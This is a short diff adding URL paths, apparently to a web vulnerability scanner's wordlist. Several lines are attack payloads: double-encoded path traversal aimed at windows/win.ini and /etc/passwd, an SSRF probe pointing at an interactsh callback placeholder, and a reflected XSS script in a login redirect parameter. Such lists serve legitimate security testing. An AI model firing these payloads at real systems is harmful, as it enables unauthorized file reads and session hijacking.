@@ -1,0 +1,8 @@
+/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
+/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
+/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd
+/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/proxy.stream?origin=http://{{interactsh-url}}
+/i18n/component/JS?locale=en-US
+/api/v1/version
+/login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script>
